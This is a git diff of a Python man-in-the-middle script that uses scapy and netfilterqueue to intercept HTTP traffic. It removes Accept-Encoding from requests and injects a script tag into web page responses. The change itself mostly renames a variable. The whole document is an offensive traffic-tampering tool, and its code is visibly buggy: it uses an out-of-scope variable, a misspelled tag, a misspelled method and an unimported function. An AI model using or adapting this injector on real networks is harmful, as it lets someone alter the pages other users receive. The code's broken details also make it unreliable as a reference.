@@ -7,35 +7,35 @@ ack_list = []
 
 
 def set_load(packet, load):
-    my_packet[scapy.Raw].load = load
-    del my_packet[scapy.IP].len
-    del my_packet[scapy.IP].chksum
-    del my_packet[scapy.TCP].chksum
+    http_packet[scapy.Raw].load = load
+    del http_packet[scapy.IP].len
+    del http_packet[scapy.IP].chksum
+    del http_packet[scapy.TCP].chksum
     return packet
 
 
 def process_packet(packet):
-    my_packet = scapy.IP(packet.get_payload())
-    if my_packet.haslayer(scapy.Raw):
-        load = my_packet[scapy.Raw].load
-        if my_packet[scapy.TCP].dport == 80:
+    http_packet = scapy.IP(packet.get_payload())
+    if http_packet.haslayer(scapy.Raw):
+        load = http_packet[scapy.Raw].load
+        if http_packet[scapy.TCP].dport == 80:
             print("[+] Request...")
             load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
 
-        elif my_packet[scapy.TCP].sport == 80:
+        elif http_packet[scapy.TCP].sport == 80:
             print("[+] Response...")
             load = load.replace("</body>", "<scrip>alert('test');</script></body>")
-            new_packet = set_load(my_packet, load)
+            new_packet = set_load(http_packet, load)
             packet.set_payload(str(new_packet))
 
-        if load != my_packet[scapy.Raw].load:
-            new_packet = set_load(my_packet, load)
+        if load != http_packet[scapy.Raw].load:
+            new_packet = set_load(http_packet, load)
             packet.setpayload(str(new_packet))
 
     packet.accept()
-    send(my_packet)
+    send(http_packet)
 
 
-# queue = netfilterqueue.NetfiletrQueue()
+# queue = netfilterqueue.NetfilterQueue()
 # queue.bind(0, process_packet)
 # queue.run()
